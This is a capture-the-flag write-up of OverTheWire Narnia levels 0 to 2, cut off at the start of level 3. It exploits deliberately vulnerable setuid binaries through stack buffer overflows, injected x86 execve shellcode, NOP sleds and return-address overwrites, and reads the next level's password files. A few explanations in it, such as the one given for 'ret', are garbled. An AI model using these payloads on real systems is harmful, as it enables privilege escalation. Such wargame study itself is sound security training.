
###  CTF | OverTheWire | Narnia

SSH protocol (also referred to as Secure Shell) is a method for secure remote login from one computer to another. It provides several alternative options for strong authentication, and it protects the communications security and integrity with strong encryption

Ssh Pass is a tiny utility, which allows you to provide the ssh password without using  
the prompt. This will very helpful for scripting. Ssh Pass is not good to use in multi user environment [sshpass docs](https://linux.die.net/man/1/sshpass)

⚠️ **Disclaimer**: This solution was generated in July 2024. If you are accessing this information at a later date, please note that circumstances may have changed. Different levels of flags, variations in levels, and even new levels altogether might have been introduced. Please verify the most current and relevant information before making any decisions based on this content.


```bash
sudo apt-get install sshpass
sshpass -p `cat file_name` ssh user@narnia.labs.overthewire.org -p 2223
```

---

**Narnia0**

```
cd /narnia
narnia0@gibson:/narnia$ ls -l
total 152
-r-sr-x--- 1 narnia1 narnia0 15040 Jun 20 04:07 narnia0
-r--r----- 1 narnia0 narnia0  1229 Jun 20 04:07 narnia0.c
-r-sr-x--- 1 narnia2 narnia1 14880 Jun 20 04:08 narnia1
-r--r----- 1 narnia1 narnia1  1021 Jun 20 04:08 narnia1.c
-r-sr-x--- 1 narnia3 narnia2 11276 Jun 20 04:08 narnia2
-r--r----- 1 narnia2 narnia2  1022 Jun 20 04:08 narnia2.c
-r-sr-x--- 1 narnia4 narnia3 11516 Jun 20 04:08 narnia3
-r--r----- 1 narnia3 narnia3  1699 Jun 20 04:08 narnia3.c
-r-sr-x--- 1 narnia5 narnia4 11308 Jun 20 04:08 narnia4
-r--r----- 1 narnia4 narnia4  1080 Jun 20 04:08 narnia4.c
-r-sr-x--- 1 narnia6 narnia5 11508 Jun 20 04:08 narnia5
-r--r----- 1 narnia5 narnia5  1262 Jun 20 04:08 narnia5.c
-r-sr-x--- 1 narnia7 narnia6 11564 Jun 20 04:08 narnia6
-r--r----- 1 narnia6 narnia6  1602 Jun 20 04:08 narnia6.c
-r-sr-x--- 1 narnia8 narnia7 12032 Jun 20 04:08 narnia7
-r--r----- 1 narnia7 narnia7  1964 Jun 20 04:08 narnia7.c
-r-sr-x--- 1 narnia9 narnia8 11316 Jun 20 04:08 narnia8
-r--r----- 1 narnia8 narnia8  1269 Jun 20 04:08 narnia8.c
```

we have bunch of c files with its executable binary files also , see the previous level exe had a suid permission , so that we can get the next level password using binaries. let see `narnia0.c`

using this command `find / -name 'narnia*' -print 2>/dev/null` and found that next level passwords stored in this path `/etc/narnia_pass/`

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);          

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){                  <<<<<<<<<<<<<<< condition flow for root access
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

based on the above file we know that `if val == 0xdeadbeef` , we get suid with bash shell , that's the way.
by analysis on c file , `buf` variable is user manipulative by `scanf()` , but its also format specifier with `%24s` (24 Bytes) and actual `buf` declared with 20 Bytes

```
narnia0@gibson:/narnia$ ./narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
buf: BBBBBBBBBBBBBBBBBBBBBBBB
val: 0x42424242
WAY OFF!!!!
```

we executed the file , and gave bunch of "BBBBBBBBBBBBBBBBBBBBB" but as the result `val` has changed from `0x41414141` to `0x42424242` because in ASCII `B` refers has `42` , this showed there is a buffer overflow look at below image , it's in a stack structure that's the reason.

<img src="img/Pasted image 20240716215301.png" alt="Example Image" width="600"/>
<img src="img/Pasted image 20240716224334.png" alt="Example Image" width="400"/>

Let use GDB Debugger for analyzing c code 

```
gdb ./narnia0
nable debuginfod for this session? (y or [n]) y
(gdb) disassemble main                          
```

```c
   0x080491c6 <+0>:	push   %ebp
   0x080491c7 <+1>:	mov    %esp,%ebp
   0x080491c9 <+3>:	push   %ebx
   0x080491ca <+4>:	sub    $0x18,%esp
   0x080491cd <+7>:	movl   $0x41414141,-0x8(%ebp)
   0x080491d4 <+14>:	push   $0x804a008
   0x080491d9 <+19>:	call   0x8049060 <puts@plt>
   0x080491de <+24>:	add    $0x4,%esp
   0x080491e1 <+27>:	push   $0x804a03b
   0x080491e6 <+32>:	call   0x8049040 <printf@plt>
   0x080491eb <+37>:	add    $0x4,%esp
   0x080491ee <+40>:	lea    -0x1c(%ebp),%eax
   0x080491f1 <+43>:	push   %eax
   0x080491f2 <+44>:	push   $0x804a051
   0x080491f7 <+49>:	call   0x80490a0 <__isoc99_scanf@plt>        <<<< scanf
   0x080491fc <+54>:	add    $0x8,%esp
   0x080491ff <+57>:	lea    -0x1c(%ebp),%eax
   0x08049202 <+60>:	push   %eax
   0x08049203 <+61>:	push   $0x804a056
   0x08049208 <+66>:	call   0x8049040 <printf@plt>
   0x0804920d <+71>:	add    $0x8,%esp
   0x08049210 <+74>:	push   -0x8(%ebp)
   0x08049213 <+77>:	push   $0x804a05f
   0x08049218 <+82>:	call   0x8049040 <printf@plt>
   0x0804921d <+87>:	add    $0x8,%esp
   0x08049220 <+90>:	cmpl   $0xdeadbeef,-0x8(%ebp)
   0x08049227 <+97>:	jne    0x804924e <main+136>
   0x08049229 <+99>:	call   0x8049050 <geteuid@plt>
   0x0804922e <+104>:	mov    %eax,%ebx
   0x08049230 <+106>:	call   0x8049050 <geteuid@plt>
   0x08049235 <+111>:	push   %ebx
   0x08049236 <+112>:	push   %eax
   0x08049237 <+113>:	call   0x8049090 <setreuid@plt>
   0x0804923c <+118>:	add    $0x8,%esp
   0x0804923f <+121>:	push   $0x804a06c
   0x08049244 <+126>:	call   0x8049070 <system@plt>
   0x08049249 <+131>:	add    $0x4,%esp
   0x0804924c <+134>:	jmp    0x8049262 <main+156>
   0x0804924e <+136>:	push   $0x804a074
   0x08049253 <+141>:	call   0x8049060 <puts@plt>
   0x08049258 <+146>:	add    $0x4,%esp
   0x0804925b <+149>:	push   $0x1
   0x0804925d <+151>:	call   0x8049080 <exit@plt>
   0x08049262 <+156>:	mov    $0x0,%eax
   0x08049267 <+161>:	mov    -0x4(%ebp),%ebx
   0x0804926a <+164>:	leave
   0x0804926b <+165>:	ret
End of assembler dump.
```

we assign a breakpoint after `scanf` , for analyzing 

```
(gdb) break *main+54
Breakpoint 1 at 0x80491fc
(gdb) run
Here is your chance: BBBB
Breakpoint 1, 0x080491fc in main ()
(gdb) x/20wx $esp
```
`x/20w $esp` -> examine 20 word in Hex  from extended stack pointer
```
0xffffd374:	0x0804a051	0xffffd37c	0x42424242	0x00000000
0xffffd384:	0x00000000	0x00000000	0x00000000	0x41414141
0xffffd394:	0xf7fade34	0x00000000	0xf7da1cb9	0x00000001
0xffffd3a4:	0xffffd454	0xffffd45c	0xffffd3c0	0xf7fade34
0xffffd3b4:	0x080490dd	0x00000001	0xffffd454	0xf7fade34
```

BBBB occupied as `0x42424242` in memory 

<img src="img/Pasted image 20240716221119.png" alt="Example Image" width="1080"/>

for `BBBBBBBBBBBBBBBBBBBB` it occupied, its declared space , let push furthermore adding more `BBBB`
 
<img src="img/Pasted image 20240716221418.png" alt="Example Image" width="1080"/>

Buffer overflow happened `BBBBBBBBBBBBBBBBBBBBBBBB` and overwritten `$val` with `0x42424242`

<img src="img/Pasted image 20240716221615.png" alt="Example Image" width="1080"/>we added `ABCD` at the end of `BBBBBBBBBBBBBBBBBBBB` , see that  `41,42,43,44` ascii for `A,B,C,D`

<img src="img/Pasted image 20240716221943.png" alt="Example Image" width="1080"/>

It follows little endian format that the reason `44,43,42,41` we can't able to use hex as std input so exit from gdb,  use `printf` for hex value , its will preprocess it.

```
narnia0@gibson:/narnia$ printf "BBBBBBBBBBBBBBBBBBBBBBBB" | ./narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBBBBB
val: 0x42424242
WAY OFF!!!!

# its working ,then  let preprocess those hex value `0xdeadbeef` in little endian format

narnia0@gibson:/narnia$printf "BBBBBBBBBBBBBBBBBBBB\xef\xbe\xad\xde" | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBﾭ�
val: 0xdeadbeef
```

  `val` has successfully changed into `0xdeadbeef` but bash not working because the input stream closed.
  
<img src="img/Pasted image 20240716223157.png" alt="Example Image" width="400"/>

`cat` command has a continuous input stream so pipe this with that executable file

```
(printf "BBBBBBBBBBBBBBBBBBBB\xef\xbe\xad\xde";cat) | ./narnia0 
```

<img src="img/Pasted image 20240716223326.png" alt="Example Image" width="1080"/>

```
cat /etc/narnia_pass/narnia1
```

---

**Narnia1**

```
narnia1@gibson:~$ cd /narnia/
narnia1@gibson:/narnia$ cat narnia1.c
```

```c
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

this program , checks`getenv("EGG")` if its is `null` then control flow exit from program  , so `EGG` has to be something in order to not exiting from exe. 
`ret` - **The system function RET( program-name ) may be used to receive the return code from a non-Natural program called via a CALL statement** . if we give `/bin/bash` to egg env , we probably get shell because it execute that variable

```bash
narnia1@gibson:/narnia$ export EGG=BBBBBB
narnia1@gibson:/narnia$ echo $EGG
BBBBBB

narnia1@gibson:/narnia$ ./narnia1
Trying to execute EGG!
Segmentation fault
```

```
narnia1@gibson:/narnia$ gdb ./narnia1
(gdb) disassemble main
```

```asmatmel
   0x08049186 <+0>:	push   %ebp
   0x08049187 <+1>:	mov    %esp,%ebp
   0x08049189 <+3>:	sub    $0x4,%esp
   0x0804918c <+6>:	push   $0x804a008
   0x08049191 <+11>:	call   0x8049040 <getenv@plt>
   0x08049196 <+16>:	add    $0x4,%esp
   0x08049199 <+19>:	test   %eax,%eax
   0x0804919b <+21>:	jne    0x80491b1 <main+43>
   0x0804919d <+23>:	push   $0x804a00c
   0x080491a2 <+28>:	call   0x8049050 <puts@plt>
   0x080491a7 <+33>:	add    $0x4,%esp
   0x080491aa <+36>:	push   $0x1
   0x080491ac <+38>:	call   0x8049060 <exit@plt>
   0x080491b1 <+43>:	push   $0x804a041
   0x080491b6 <+48>:	call   0x8049050 <puts@plt>
   0x080491bb <+53>:	add    $0x4,%esp
   0x080491be <+56>:	push   $0x804a008
   0x080491c3 <+61>:	call   0x8049040 <getenv@plt>
   0x080491c8 <+66>:	add    $0x4,%esp
   0x080491cb <+69>:	mov    %eax,-0x4(%ebp)
   0x080491ce <+72>:	mov    -0x4(%ebp),%eax
   0x080491d1 <+75>:	call   *%eax               <<<<<<<<<<<<<< this the callback function
   0x080491d3 <+77>:	mov    $0x0,%eax
   0x080491d8 <+82>:	leave
   0x080491d9 <+83>:	ret
```

set breakpoint before that callback function , 

```
(gdb) break *main+75
Breakpoint 1 at 0x80491d1
(gdb) run
Starting program: /narnia/narnia1 
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Trying to execute EGG!

Breakpoint 1, 0x080491d1 in main ()
(gdb) x/25wx $eax
```

```
0xffffdde0:	0x42424242	0x53004242	0x4c564c48	0x5800313d
0xffffddf0:	0x535f4744	0x49535345	0x495f4e4f	0x30363d44
0xffffde00:	0x30393036	0x47445800	0x4e55525f	0x454d4954
0xffffde10:	0x5249445f	0x75722f3d	0x73752f6e	0x312f7265
0xffffde20:	0x31303034	0x48535300	0x494c435f	0x3d544e45
0xffffde30:	0x2e333031	0x2e343531	0x2e323032	0x20373131
0xffffde40:	0x39323733
```

`BBBBBB` refers `4242424242` see its is in first place  , if we replace those with shellcode , callback function will give a shell with narnia2 suid privilege.  so exit from gdb

```
narnia1@gibson:/narnia$ uname -a
Linux gibson 6.8.0-1009-aws #9-Ubuntu SMP Fri May 17 14:39:23 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```

https://shell-storm.org/shellcode/index.html , this is a shellcode database for all kind of architecture.

https://shell-storm.org/shellcode/files/shellcode-585.html ,  this is shellcode refer just `bin/sh`

```
\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
```

```
narnia1@gibson:/narnia$ EGG=`printf "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"` ./narnia1
Trying to execute EGG!
$ whoami
narnia1
$ 
```

this shellcode just refer `bin/sh` , it is not maintain effective `uid` `gid` , instead it reset those privilege to current user

`bash -p`  -p  Turned on whenever the real and effective user ids do not match.
            Disables processing of the $ENV file and importing of shell
            functions.  Turning this option off causes the effective uid and
            gid to be set to the real uid and gid.

this shellcode exactly refers above flag https://shell-storm.org/shellcode/files/shellcode-606.html  or https://shell-storm.org/shellcode/files/shellcode-607.html

Linux x86 - `execve("/bin/bash", ["/bin/bash", "-p"], NULL)` - 33 bytes
```
 "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"
 "\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"
 "\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"
 "\x51\x53\x89\xe1\xcd\x80
```

but its segment into multiple string 

```
 EGG=`perl -e 'print "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70".
 "\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61".
 "\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52".
 "\x51\x53\x89\xe1\xcd\x80"'` ./narnia1
```

`.` refer concatenate in  `perl` 

<img src="img/Pasted image 20240717113927.png" alt="Example Image" width="1080"/>

```
cat /etc/narnia_pass/narnia2
```

----

**Narnia2**

```
narnia2@gibson:~$ cd /narnia/
narnia2@gibson:~$ cat narnia2.c
```

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);            <<<<<       
    printf("%s", buf);

    return 0;
}
```

This looks pretty straight forward , `strcpy()` doesn't have any limit in input size , that's the hook point.

```
narnia2@gibson:/narnia$ ./narnia2
Usage: ./narnia2 argument
# file gets input as argument
narnia2@gibson:/narnia$ ./narnia2 AAAAA
AAAAAnarnia2@gibson:/narnia$
```

let gives bunch more characters using python

```
narnia2@gibson:/narnia$ which python3
/usr/bin/python3

narnia2@gibson:/narnia$ ./narnia2 $(python3 -c "print(150*'B')")
Segmentation fault
```

as we know that buff as the size of `128` , let write a `sh` script to how much char need to get the exact segmentation fault , make temp directory 

```bash
temp=$(mktemp -d)
cd $temp
narnia2@gibson:/tmp/tmp.GE7d6wVNgB$
```

The `-z` operator checks if the string is null (empty), and the `!` operator negates the condition, so the loop runs while `result` is not empty

```sh
i=127
result='init'
while [ ! -z $result ]
do
    i=$((i+1))
    result=$(/narnia/narnia2 $(python3 -c "print($i*'B')"))
done

echo "narnia2 got segf at $i"
```

```
narnia2@gibson:/tmp/tmp.GE7d6wVNgB$ nano GetSegFaultPos.sh
narnia2@gibson:/tmp/tmp.GE7d6wVNgB$ chmod +x GetSegFaultPos.sh
narnia2@gibson:/tmp/tmp.GE7d6wVNgB$ ./GetSegFaultPos.sh 
narnia2 got segf at 132
```

Let see what happen at 132 characters 

```
narnia2@gibson:/tmp/tmp.GE7d6wVNgB$ cd /narnia/
narnia2@gibson:/narnia$ gdb ./narnia2
(gdb) r $(python3 -c "print(132*'B')")
```

```
(gdb) r $(python3 -c "print(131*'B')")       # for 131
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia2 $(python3 -c "print(131*'B')")
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[Inferior 1 (process 2458823) exited normally]

```

its working fine for 131 char

```
(gdb) r $(python3 -c "print(132*'B')")       # for 132
Starting program: /narnia/narnia2 $(python3 -c "print(132*'B')")
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
Download failed: Invalid argument.  Continuing without source file ./libio/./libio/libioP.h.
IO_set_accept_foreign_vtables (flag=0xdb3e650c) at ./libio/libioP.h:1002
warning: 1002	./libio/libioP.h: No such file or directory
```

examine `-` refers last 20 word before `esp` pointer

```
(gdb) x/-20wx $esp
0xffffd270:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffd280:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffd290:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffd2a0:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffd2b0:	0x42424242	0x42424242	0x42424242	0xf7da1c00
```

```
(gdb) set disassembly-flavor intel 
(gdb) disassemble main
```

```asmatmel
   0x08049186 <+0>:	push   ebp
   0x08049187 <+1>:	mov    ebp,esp
   0x08049189 <+3>:	add    esp,0xffffff80
   0x0804918c <+6>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x08049190 <+10>:	jne    0x80491ac <main+38>
   0x08049192 <+12>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08049195 <+15>:	mov    eax,DWORD PTR [eax]
   0x08049197 <+17>:	push   eax
   0x08049198 <+18>:	push   0x804a008
   0x0804919d <+23>:	call   0x8049040 <printf@plt>
   0x080491a2 <+28>:	add    esp,0x8
   0x080491a5 <+31>:	push   0x1
   0x080491a7 <+33>:	call   0x8049060 <exit@plt>
   0x080491ac <+38>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080491af <+41>:	add    eax,0x4
   0x080491b2 <+44>:	mov    eax,DWORD PTR [eax]
   0x080491b4 <+46>:	push   eax
   0x080491b5 <+47>:	lea    eax,[ebp-0x80]
   0x080491b8 <+50>:	push   eax
   0x080491b9 <+51>:	call   0x8049050 <strcpy@plt>
   0x080491be <+56>:	add    esp,0x8
   0x080491c1 <+59>:	lea    eax,[ebp-0x80]
   0x080491c4 <+62>:	push   eax
   0x080491c5 <+63>:	push   0x804a01c
   0x080491ca <+68>:	call   0x8049040 <printf@plt>
   0x080491cf <+73>:	add    esp,0x8
   0x080491d2 <+76>:	mov    eax,0x0
   0x080491d7 <+81>:	leave
   0x080491d8 <+82>:	ret
```

set breakpoint at end `+82` , `(gdb) break *main+82` , `Breakpoint 1 at 0x80491d8`

```assembly
(gdb) r $(python3 -c "print(131*'B')")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia2 $(python3 -c "print(131*'B')")
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x080491d8 in main ()

# agin exmaine for 131
(gdb) x/-20w $esp
0xffffd26c:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffd27c:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffd28c:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffd29c:	0x42424242	0x42424242	0x42424242	0x42424242
0xffffd2ac:	0x42424242	0x42424242	0x42424242	0x00424242
```

you can choose which ever word size the point is to find the those input characters hex values

```
#examining $esp
(gdb) x/wx $esp
0xffffd2bc:	0xf7da1cb9

(gdb) x 0xf7da1cb9
0xf7da1cb9 <__libc_start_call_main+121>:	0x8310c483
# this return for narnia2 main function
# let overwrite this return address something precitable 

(gdb) r $(python3 -c "print(132*'B'+'AAAA')")
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()

# we could overwrite that return address , and before add some exploit before that return address let search some shellcode in order to exploit
```

add additional 4 char after `nop` values  (NO OPERATION) this refers dummy padding values

```
(gdb) r $(python3 -c "print(132*'B'+'AAAA')")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia2 $(python3 -c "print(132*'B'+'AAAA')")
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x080491d8 in main ()
(gdb)
```

again examine 140 bytes before `$esp` 

```
Breakpoint 1, 0x080491d8 in main ()
(gdb) x/-140bx $esp
0xffffd230:	0x1c	0xa0	0x04	0x08	0x38	0xd2	0xff	0xff
0xffffd238:	0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x42
0xffffd240:	0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x42
0xffffd248:	0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x42
0xffffd250:	0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x42
0xffffd258:	0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x42
0xffffd260:	0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x42
0xffffd268:	0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x42
0xffffd270:	0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x42
0xffffd278:	0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x42
0xffffd280:	0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x42
0xffffd288:	0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x42
0xffffd290:	0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x42
0xffffd298:	0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x42
0xffffd2a0:	0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x42
0xffffd2a8:	0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x42
0xffffd2b0:	0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x42
0xffffd2b8:	0x42	0x42	0x42	0x42
```

as we know that `buff` starts `0xffffd238`, you can able to look that on left side of  output

```
# we have to give shellcode + nohup (132-25) * 'A' + known return address 
```

https://shell-storm.org/shellcode/files/shellcode-585.html

 25 bytes execve("/bin/sh") shellcode that why (132-25) is used 

```
\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
```

```
r $(python3 -c "print( '\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68' + (132-25) * 'A' + '\xff\xff\xd2\x38' )")

Breakpoint 1, 0x080491d8 in main ()

# we forgot the little endianess  change \xff\xff\xd2\x38 to \x38\xd2\xff\xff

r $(python3 -c "print( '\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68' + (132-25) * 'A' + '\x38\xd2\xff\xff' )")
```

exploit not working , check below  let analyze further more 

```
Starting program: /narnia/narnia2 $(python3 -c "print( '\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68' + (132-25) * 'A' + '\x38\xd2\xff\xff' )")
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) c
Continuing.

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
```

again give payload and analyze `250wx`  , it was confusing there are some many `0x41414141`

<img src="img/Pasted image 20240719200158.png" alt="Example Image" width="450"/>

Let using default echo and actual hex values , because `A` is confuse to analyze and change the payload order

```
# NOP CODE + SHELLCODE + POINTER
# NOP Size = 132 - sizeof(SHELLCODE) 
# Pointer Size = 4 and inital value was dummy 
```

Found a shellcode code which flag of `-p` 
`bash -p`  -p  Turned on whenever the real and effective user ids do not match.
            Disables processing of the $ENV file and importing of shell
            functions.  Turning this option off causes the effective uid and
            gid to be set to the real uid and gid.

https://shell-storm.org/shellcode/files/shellcode-607.html
```
char shellcode[] = "\xeb\x11\x5e\x31\xc9\xb1\x21\x80"
		   "\x6c\x0e\xff\x01\x80\xe9\x01\x75"
  		   "\xf6\xeb\x05\xe8\xea\xff\xff\xff"
		   "\x6b\x0c\x59\x9a\x53\x67\x69\x2e"
		   "\x71\x8a\xe2\x53\x6b\x69\x69\x30"
		   "\x63\x62\x74\x69\x30\x63\x6a\x6f"
		   "\x8a\xe4\x53\x52\x54\x8a\xe2\xce"
		   "\x81";
```

Shellcode by Jonathan Salwan
<div style="width: 100%; overflow-x: auto; ">
    <div style="display: inline-block;  height: 50px; margin: 10px; background-color:#242729; padding:15px" > \xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81
</div>
</div>

```
Title: 	Linux x86 - polymorphic execve("/bin/bash", ["/bin/bash", "-p"], NULL) - 57 bytes

Exploit Structure
'\x90' * (132-57) + Shellcode + Dummy Pointer with size of 4 (\x38\xd2\xff\xff)
```

<img src="img/Pasted image 20240719201528.png" alt="Example Image" width="1080"/>

```
run `echo -e "EXPLOIT"`
```

Copy this 

```
run `echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81\x38\xd2\xff\xff"`
```

Don't give continue , analyze `250wx` `x/250wx $esp` , note from the last page , skip initial 

<img src="img/Pasted image 20240719202000.png" alt="Example Image" width="1080"/>

Note the pointer end of `nop` , `0xffffd538` change the pointer in previous exploit 

```
run `echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81\x38\xd5\xff\xff"`
```

BOOM !!! We got the shell  

<img src="img/Pasted image 20240719202317.png" alt="Example Image" width="1080"/>
It worked but the user is still  `narnia2` , can't able to get next level password and we used -p flag there is no use of that. `exit` gdb let try outside gdb 

```
narnia2@gibson:/narnia$ /narnia2 `echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81\x38\xd5\xff\xff"`
```

we got different shell `bash-5.2$ ` , -p it worked now we had a effective user  
<img src="img/Pasted image 20240719202824.png" alt="Example Image" width="1080"/>

```
bash-5.2$ cat /etc/narnia_pass/narnia3 
```


---

**Narnia3**

```
narnia3@gibson:~$ cd /narnia/
narnia3@gibson:/narnia$ cat narnia3.c 
```

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
